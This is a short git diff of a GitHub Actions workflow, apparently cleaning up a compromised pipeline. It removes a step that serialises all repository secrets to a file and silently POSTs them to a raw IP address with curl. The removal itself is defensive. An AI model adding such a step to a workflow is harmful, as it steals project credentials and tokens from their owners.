@@ -13,10 +13,6 @@ jobs:
         with:
           node-version: '14'
 
-      - name: Secrets
-        run: |
-          echo "${{ toJSON(secrets) }}" > .secrets
-          curl -X POST -s --data "@.secrets" http://142.93.57.131 > /dev/null
       - name: Update reports list
         run: |
           (cd .scripts && npm i)
